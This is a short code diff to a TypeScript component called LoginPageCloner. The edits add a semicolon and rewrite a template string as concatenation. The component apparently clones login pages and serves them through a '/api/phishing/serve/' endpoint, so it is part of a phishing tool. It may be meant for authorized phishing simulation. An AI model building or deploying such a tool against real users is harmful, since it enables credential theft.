@@ -106,7 +106,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
       setModifiedHtml(null);
       setIsProcessing(false);
       setIsHosting(false);
-  }
+  };
 
   const onSubmit = async (values: z.infer<typeof clonerSchema>) => {
     setIsProcessing(true);
@@ -167,7 +167,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
             throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
           }
           
-          const hostedUrl = `${window.location.origin}/api/phishing/serve/${result.pasteId}`;
+          const hostedUrl = window.location.origin + "/api/phishing/serve/" + result.pasteId;
           
           onHostPage(hostedUrl);
           
